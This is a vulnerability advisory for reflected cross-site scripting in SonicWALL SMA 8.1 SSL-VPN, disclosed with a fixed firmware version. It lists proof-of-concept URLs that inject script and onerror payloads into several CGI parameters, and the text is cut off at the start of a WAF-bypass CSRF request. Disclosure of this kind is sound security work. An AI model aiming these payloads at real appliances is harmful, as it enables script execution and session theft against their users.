 
 
Vendor: Dell Inc.
Product web page: https://www.sonicwall.com/products/secure-mobile-access/
Affected version: 8.1 (SSL-VPN)
 
Summary: Keep up with the demands of todayâ€™s remote workforce. Enable secure
mobile access to critical apps and data without compromising security. Choose
from a variety of scalable secure mobile access (SMA) appliances and intuitive
Mobile Connect apps to fit every size business and budget.
 
Desc: SonicWALL SMA suffers from a XSS issue due to a failure to properly sanitize
user-supplied input to several parameters. Attackers can exploit this weakness
to execute arbitrary HTML and script code in a user&#039;s browser session. The WAF was
bypassed via form-based CSRF.
 
Tested on: SonicWALL SSL-VPN Web Server
 
 
Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                            @zeroscience
 
 
Advisory ID: ZSL-2016-5392
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5392.php
 
Firmware fixed: 8.1.0.3
Issue ID: 172692
http://documents.software.dell.com/sonicwall-sma-100-series/8.1.0.3/release-notes/resolved-issues?ParentProduct=869
 
 
 
26.01.2016
 
--
 
 
Reflected XSS via protocol parameter (GET):
-------------------------------------------
 
https://127.0.0.1/cgi-bin/ftplauncher?protocol=sftp:</script><img%20src=a%20onerror=confirm(1)>&bmId=55
 
 
XSS via arbitrary parameter (GET):
----------------------------------
 
https://127.0.0.1/cgi-bin/handleWAFRedirect?hdl=VqjLncColvAAAF4QB2YAAAAT&<script>alert(2)</script>=zsl
 
 
XSS via REMOTEPATH parameter (GET):
-----------------------------------
 
https://127.0.0.1/cgi-bin/soniclauncher?REMOTEPATH=//servername/share/</script><img%20src=a%20onerror=confirm(3)>&bmId=59
 
 
WAF Cross-Site Request Forgery PoC:
-----------------------------------
 
POST /cgi-bin/editBookmark HTTP/1.1
Host: 127.0.0.1
 

